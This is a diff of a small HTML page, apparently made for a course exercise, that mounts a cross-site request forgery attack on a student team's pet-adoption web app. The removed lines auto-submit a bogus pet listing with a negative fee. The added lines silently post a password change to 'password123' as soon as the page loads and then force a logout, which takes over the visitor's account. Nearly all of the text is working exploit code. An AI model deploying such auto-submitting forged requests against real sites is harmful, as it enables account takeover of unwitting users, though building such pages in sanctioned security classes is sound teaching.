@@ -6,20 +6,15 @@
     <title>Document</title>
 </head>
 <body>
-    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/post_pets" method="POST" id="form">
-        <input type="text" name="name" value="EVILLLLL">
-        <input type="text" name="animalType" value="1">
-        <input type="text" name="breed" value="pikachu">
-        <input type="text" name="size" value="1">
-        <input type="text" name="age" value="94">
-        <input type="text" name="sex" value="1">
-        <input type="text" name="description" value="this is one of the dogs of all time">
-        <input type="text" name="adoptionFee" value="-5000">
-        <input type="text" name="petPhoto" value="https://bevwere.files.wordpress.com/2013/04/evil.jpg">
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/account" method="POST" id="form">
+        <input name="new_password" value="password123">
     </form>
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/logout" method="GET" id="logout"></form>
     <script>
-        const postPet = document.querySelector("#form")
-        postPet.submit();
+        const changePass = document.querySelector("#form")
+        changePass.submit();
+        const logout = document.querySelector("#logout")
+        logout.submit();
     </script>
 </body>
 </html>
